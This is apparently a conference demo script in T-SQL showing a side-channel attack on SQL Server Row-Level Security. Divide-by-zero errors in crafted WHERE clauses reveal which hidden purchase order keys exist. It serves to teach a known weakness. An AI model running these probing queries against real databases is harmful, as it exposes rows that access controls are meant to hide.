/*******************************************************************
*	Session:	Side Channel Attacks in SQL Server
*	Author:		Ben Johnston
*	Name:		Demo03.RLS.01.SideChannel.Keys.sql
*	Notes:		Basic RLS side channel attack
*				Demonstrates how the key range can be found.
********************************************************************/
USE WWISideChannel
SET NOCOUNT ON
GO

--Show that no rows are returned
SELECT *
FROM Purchasing.PurchaseOrders

--Basic side channel attack
--Divide by zero error when it matches
--Error 8134
SELECT *
FROM Purchasing.PurchaseOrders
WHERE PurchaseOrderID = 1
	AND 1/(PurchaseOrderID - 1) = 0

--Continue the attack
--Shows that keys go to 2000
SELECT *
FROM Purchasing.PurchaseOrders
WHERE PurchaseOrderID = 2000
	AND 1/(PurchaseOrderID - 2000) = 0

--No error
--Indicates the query is beyond the range
--or the value is missing
SELECT *
FROM Purchasing.PurchaseOrders
WHERE PurchaseOrderID = 10000
	AND 1/(PurchaseOrderID - 10000) = 0
GO

REVERT
GO
